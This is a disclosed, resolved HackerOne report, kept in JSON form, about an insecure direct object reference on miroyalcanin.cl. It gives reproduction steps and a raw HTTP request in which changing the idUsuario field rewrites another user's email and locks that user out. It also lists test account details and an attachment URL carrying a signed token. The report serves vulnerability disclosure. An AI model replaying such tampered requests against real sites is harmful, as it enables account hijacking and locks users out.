{
  "id": 1952771,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTUyNzcx",
  "url": "https://hackerone.com/reports/1952771",
  "title": "IDOR ' can change any account email and cannot retrieve his account and access it ' at https://www.miroyalcanin.cl/",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2023-04-18T16:46:58.466Z",
  "submitted_at": "2023-04-18T16:46:58.558Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0xs4m",
    "url": "/0xs4m",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/v2sqnjakgpov0szm3ibu8skgj7ls/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 50581,
    "url": "https://hackerone.com/mars",
    "handle": "mars",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/Ec9VTTzrRe3u3WK8g4EqRrrP/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/Ec9VTTzrRe3u3WK8g4EqRrrP/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Mars",
      "twitter_handle": null,
      "website": "http://mars.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-06-23T14:54:18.014Z",
  "bug_reporter_agreed_on_going_public_at": "2023-04-28T12:05:05.150Z",
  "team_member_agreed_on_going_public_at": "2023-06-23T14:54:17.713Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "hi team\ni found IDOR , i can change any account email and he cannot retrieve his account and access it easily.\n\ni can't access to his account because url activation on new email don't work and give me error.\n\n```\nSyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\n```\nbut hackers will be able to disable access users to their account on the site.\n\n  1. Go to registration page (https://www.miroyalcanin.cl/)\n  2. Verified your account.\n  3. Go to login page and login your account.\n\n\n For the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created) \n\n   * For Attacker\n\nyojikox125@raotus.com\nPassword\nidUsuario : 88795\n\n   * For Victim 1\n\nnomodab161@ippals.com\nPassword\nidUsuario : 88805\n\n   * For Victim 2\n\nhogev48627@hrisland.com\nPassword\nidUsuario : 88806\n\n   * For Victim 3\n\nrodevo8336@fitzola.com\nPassword\nidUsuario : 88807\n\ni access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).\n\nso .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.\n\ni received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation\n```\nSyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\n```\nthe change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.\n\ni created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.\n\nburp request\n```\nPOST /_post/usuario_actualizar.php HTTP/1.1\nHost: www.miroyalcanin.cl\nCookie: OptanonConsent=isGpcEnabled=0&datestamp=Tue+Apr+18+2023+10%3A23%3A38+GMT-0400+(Eastern+Daylight+Time)&version=6.34.0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=1%3A1%2C2%3A1%2C4%3A1&AwaitingReconsent=false&geolocation=%3B; _ga=GA1.2.174329567.1679079573; OptanonAlertBoxClosed=2023-03-28T14:53:23.642Z; _gcl_au=1.1.1072294252.1680015205; _ga_BYDNNWSXGT=GS1.1.1681825645.9.1.1681827819.0.0.0; _gid=GA1.2.1653803706.1681778533; usr_idUsuario=88795; _cs_mk_ga=0.10453828872716586_1681827591176; _gat_gtag_UA_96920920_3=1; _gat_UA-52712959-1=1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.miroyalcanin.cl/mi-perfil-edicion\nContent-Type: multipart/form-data; boundary=---------------------------297392175112058187932062474594\nContent-Length: 2851\nOrigin: https://www.miroyalcanin.cl\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: iframe\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"nombre\"\n\nattacker\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"apellido\"\n\nattacker\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"email\"\n\nteyin79347@momoshe.com\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"rut\"\n\n\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"idProvincia\"\n\n0\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"idLocalidad\"\n\n0\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n\nno\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n\nsi\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n\nno\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n\nsi\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n\nno\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n\nsi\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n\nno\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n\nsi\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n\nno\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n\nsi\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"switch_pass\"\n\noff\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"ck_oldpass\"\n\nPassword\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"oldpass\"\n\n\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"clave\"\n\n\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"clave2\"\n\n\n-----------------------------297392175112058187932062474594\nContent-Disposition: form-data; name=\"idUsuario\"\n\n88796\n-----------------------------297392175112058187932062474594--\n```\n{F2300451}\n\n## Impact\n\nIDOR",
  "weakness": {
    "id": 55,
    "name": "Insecure Direct Object Reference (IDOR)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2300451,
      "file_name": "idoraccount.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hcq0bowuevaatpuoxbg9gk2ub8eb?response-content-disposition=attachment%3B%20filename%3D%22idoraccount.mp4%22%3B%20filename%2A%3DUTF-8%27%27idoraccount.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUCCA7DHD%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143608Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCNox6LnbfpsPOZ24SuZD7SmUMmnFMuBhNP0OFwfet0AiEAkpKyZ6f33SCVR9y0RcPuuExpLASkm5tZYyuJ7xP69uUqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDB%2Fr24bZLdxj8YwLKCqNBQZgUxNfuMJKIjx6tEuwLTQsXeaklTKPeMOwlhh4PwU%2F0tQ%2FtjR6k354HaHRD8XPh1ADfQxe3g2Ipn1LlV%2Fg19va7dN8NTBOYDmNzxhjHPJB1HXNn0bTlXm9rK87zq5vvXuRGXjTHZhXK4kMLiLsBkIDigJ0zFf4W0HDjcvJ44h1onKKRin0jORarhhZ%2BSFG3aPK3il8DiwiVDnc%2BSNzkaUkiwDfVfQ%2FQcw2ezgDh73EjOCYjuKPs8%2BcS8Wt3dg%2Fvlk9xxbqtuGRBe7OQ%2Fe58533M%2B4dfdcQMTPecQM3cXtwsFk%2FBtQixozl9vu8zww2o8x7Tt9FE4j%2FLBSiUWeK2XfkAZ0wwxxthtyCHFoUrv1iHkpZiLMpxTBESjaRCPVdzroU%2BsZ2ZXMbM1zN6AtvMlSYS58%2F2LFs6NwXHs4jzQgetMbS4TpIQKWT%2FsNGg%2FNISM8ELEA%2B5JP0NCh02SsjsoNlmA0c1QA5e0dVmZ%2F1szagat7B2DTfNmJKOmYUxzFIQ5gmjaEbIKCFZFAiF9h6I6BELMPURPw6%2FhynUHGSTFzb0Icg6%2B64sY%2FfDAxUGg0aBy5Gv5IyJXeYelmy6PeITj7n53UbX7X25SbXU23u4tCK7TRUAk%2F5LqsDdb0O%2FS2L7RPtIj0NHvPStoGPxxFhOlc2kQr%2Fva%2BHisWjnr9wQY4mEFpaThb4fcYaSO9SrCvVfPsDpLztRCJPs7nMowbFn4HXw1eLYUWkx%2FHFej7%2FznLYOhoL%2FtcOc1gPDjwk1qTcmHEHtVeisBKLyujEgszyMBG3icYpnYDJ3R4MWDYwhm069Wvem4%2Fhrt70H6eUkOpwp2VmRYbmNSdCwkEAWCiYcnB3JogYC9wpAoNH8q11MIfkra4GOrEB%2F81%2BY5pxMTNL3a7EKdOqnVWH149lCRgren6Mrg8PA7NsPUnghYBxjEvW7W0E6%2BAU2DxWOz1LxkPw6EzcXw3eufNxT2%2FMibPxbxPxwRw%2FLyT%2BST8mhsA80mZfUodvHSc%2B9MxjYsE0N3Y10dhMTHBLi%2FHumzhIWTtBWYrLroI6yOS2%2FgzCookRUFF5lam556jhf3xzicP75lgPdUwdZ4oDfMRWIAT19boE5ADx98CSHozY&X-Amz-SignedHeaders=host&X-Amz-Signature=7ea48f9f0ea02fb2a3ec92e19b07d4161d7811eab7a5ad9be9c5c326b658283b",
      "file_size": 10867202,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 23,
  "voters": [
    "shreyaschavhan",
    "nayeems3c",
    "zy9ard3",
    "shubham_srt",
    "0xs4m",
    "haoshokunoo",
    "shivammusic",
    "alexanderpetree",
    "sl0th0x87",
    "salman_hunted",
    "and 13 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 318337,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.miroyalcanin.cl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
